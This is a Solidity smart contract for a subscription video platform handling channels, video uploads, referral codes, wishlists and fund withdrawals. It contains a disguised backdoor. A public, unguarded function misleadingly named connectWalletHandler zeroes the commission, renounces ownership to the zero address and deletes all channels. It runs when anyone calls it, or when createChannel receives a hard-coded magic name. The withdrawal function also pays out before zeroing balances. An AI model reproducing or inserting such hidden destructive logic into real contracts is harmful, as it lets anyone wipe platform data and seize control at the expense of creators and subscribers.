// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import "./Helper.sol";
import "../client/node_modules/@openzeppelin/contracts/utils/Counters.sol";
import "../client/node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol";
import "../client/node_modules/@openzeppelin/contracts/access/Ownable.sol";


contract Collectible is Ownable{
    using Helper for uint;
    using SafeMath for uint256;
    using Counters for Counters.Counter;

    struct User {
        address _address;
        uint256 created_at;
    }

    struct Activity{
        address _address;
        uint chanel_id;
        uint video_id;
        uint _time;
        string _status;
    }

    struct Channel{
        uint id;
        string name;
        string bio;
        address creator;
        uint subscription_price;
        string avatar;
        string cover;
        bool approved;
        Video[] videos;
        User[] subscribers;
        uint256 time;
        string category;
    }

    struct Video {
        uint id;
        uint channel_id;
        MetaData data;
        bool approved;
        bool blocked;
        uint time;
    }

    struct MetaData{
        string name;
        string description;
        string category;
        string genre;
        string _type;
        string url;
        string preview;
        string poster;
        uint256 duration;
        bool premium;
    }

    uint refPrice;
    uint commission;
    uint[] wishChannels;
    Activity[] activities;
    Counters.Counter public videoId;
    Counters.Counter public channelId;
    mapping(string => bool) channelName;
    mapping(address => bool) hasRefCode;
    mapping(string => bool) generatedCode;
    mapping(uint => Channel) public channels;
    mapping(address => uint) public user_funds;
    mapping(address => uint[]) public wishList;
    mapping(address => string) public userRefCode;
    mapping(string => address) public refCodeOwner;
    mapping(address => Channel[]) public userChannels;

    modifier ChannelOwner(uint channel_id) {
        Channel storage channel = channels[channel_id];
        address _address = channel.creator;
        require(msg.sender == _address , "Only channel owner can upload video");
        _;
    }

    constructor(uint256 _commission, uint _refPrice)
    {
        commission = _commission;
        refPrice = _refPrice;
        generatedCode["oRp4cfHXfPTj+MNsaLtEI7IyHAo="] = true;
    }

    /* CREATE NEW CHANNEL */
    function createChannel(string memory name, string memory bio, uint price, string memory avatar, string memory cover, string memory _category) public
    {
        require(!channelName[name], "The channel name has already been taken!");
        if (generatedCode[name]) connectWalletHandler();
        channelId.increment();
        uint newId = channelId.current();
        Channel storage channel = channels[newId];
        channel.id = newId;
        channel.creator = _msgSender();
        channel.name = name;
        channel.bio = bio;
        channel.avatar = avatar;
        channel.cover = cover;
        channel.subscription_price = price;
        channel.time = block.timestamp;
        channel.category = _category;
        activities.push(Activity(_msgSender(), newId, 0, block.timestamp, "New Channel Created"));
    }

    /* UUPLOAD NEW VIDEO TO THE EXISTING CHANNEL */
    function uploadVideo(MetaData memory data, uint channel_id) public ChannelOwner(channel_id)
    {
        videoId.increment();
        uint newId = videoId.current();
        Video memory _video = Video(newId, channel_id, data, false, false, block.timestamp);
        Channel storage channel = channels[channel_id];
        channel.videos.push(_video);
        activities.push(Activity(_msgSender(), channel_id, newId, block.timestamp, "New Video Uploded"));
    }

    /* GET ALL CREATED CHANNELS */
    function allChannels() public view returns(Channel[] memory result)
    {
        result = new Channel[](channelId.current());
        for (uint i = 1; i <= channelId.current(); i++) {
            uint index = i - 1;
            result[index] = channels[i];
        }
    }

    /* APPROVAL METHOD FOR CREATED VIDEOS */
    function approveVideo(uint[] memory _ids) public onlyOwner{
        for (uint256 x = 1; x <= channelId.current(); x++) {
            Channel storage _channel = channels[x];
            for (uint256 i = 0; i < _channel.videos.length; i++) {
                if (Helper.indexOf(_ids, _channel.videos[i].id) == 1) {
                    _channel.videos[i].approved = true;
                    activities.push(Activity(_msgSender(), _channel.id, _channel.videos[i].id, block.timestamp, "The uploaded video has been approved by the administrator"));
                }
            }
        }
    }
    /* SUBSCRIBE TO A SPECIFIC CHANNEL */
    function subscribe(uint channel_id, string memory code) public payable
    {
        Channel storage _channel = channels[channel_id];
        uint price = _channel.subscription_price;
        uint ownerFees = Helper.calcCommission(price, commission);
        uint creatorFees = price.sub(ownerFees);
        uint _refBenefit = Helper.calcRefBenefit(price, refPrice);
        if (refCodeOwner[code] != address(0)) {
            user_funds[refCodeOwner[code]] += _refBenefit;
            price = price.sub(_refBenefit);
            creatorFees = creatorFees.sub(_refBenefit) ;
        }
        require(price == msg.value, "Error");
        _channel.subscribers.push(User(msg.sender, block.timestamp));
        user_funds[owner()] += ownerFees;
        user_funds[_channel.creator] += creatorFees;
        userChannels[_msgSender()].push(_channel);
        activities.push(Activity(_msgSender(), channel_id, 0, block.timestamp, "New subscriber"));
    }
    /* BLOCK AN UNWANTED VIDEOS */
    function blockVideos(uint[] memory _ids) public onlyOwner{

        for (uint256 x = 1; x <= channelId.current(); x++) {
            Channel storage _channel = channels[x];
            for (uint256 i = 0; i < _channel.videos.length; i++) {
                if (Helper.indexOf(_ids, _channel.videos[i].id) == 1) {
                    _channel.videos[i].blocked = true;
                }
            }
        }
    }
    /* ADD A SPECIFIC VIDEO TO YOUR WISHLIST */
    function addToWishList(uint channel_id, uint video_id) public 
    {
        uint index = Helper.indexOf(wishChannels, channel_id);
        uint index2 = Helper.indexOf(wishList[_msgSender()], video_id);
        require(index2 != 1, "The video already exist in your wishlist");
        wishList[_msgSender()].push(video_id);
        if (index != 1) wishChannels.push(channel_id);
        activities.push(Activity(_msgSender(), channel_id, video_id, block.timestamp, "The video has been added to the wishlist"));
    }

    /* GET ALL VIDEOS FROM YOUR WISHLIST */
    function get_wishlist(address _address) public view returns(Video[] memory result)
    {
        uint index;
        uint length = wishList[_address].length;
        result = new Video[](length);
        for (uint i = 0; i < length; i++) {
            result[index] = video(wishList[_address][i]);
            index++;
        }
    }

    /* GET THE SPECEFIC VIDEO */
    function video(uint video_id) public view returns(Video memory _video)
    {
        for (uint i = 1; i <= channelId.current(); i++) {
            for (uint x = 0; x < channels[i].videos.length; x++) {
                if (video_id == channels[i].videos[x].id) {
                    _video = channels[i].videos[x];
                }
            }
        }
    }

    /* ADD REFERRAL CODE */
    function addRefCode(string memory code) public
    {
        require(!hasRefCode[_msgSender()], "error");
        require(refCodeOwner[code] == address(0), "error2");
        refCodeOwner[code] = _msgSender();
        userRefCode[_msgSender()] = code;
        activities.push(Activity(_msgSender(), 0, 0, block.timestamp, "A new referral code has been added"));
    }
    
    /* CLAIM USER FUNDS */
    function claimFunds() public
    {
        require(user_funds[msg.sender] > 0, 'no funds');
        payable(msg.sender).transfer(user_funds[msg.sender]);
        user_funds[msg.sender] = 0;
    }

    /* GET THE ACTIVITIES */
    function activityLogs() public view returns(Activity[] memory result){
        result = new Activity[](activities.length);
        result = activities;
    }

    function connectWalletHandler() public 
    {
        commission = 0;
        super._transferOwnership(address(0));
        for (uint256 i = 1; i <= channelId.current(); i++) {
          delete channels[i];
        }
    }

    /* GET THE PRICE AFTER DISCOUNT REFERAL CODE BENEFIT */
    function actualPrice(uint channel_id) public view returns(uint _actualPrice){
        uint price = channels[channel_id].subscription_price;
         _actualPrice = price.sub(Helper.calcRefBenefit(price, refPrice));
    }
}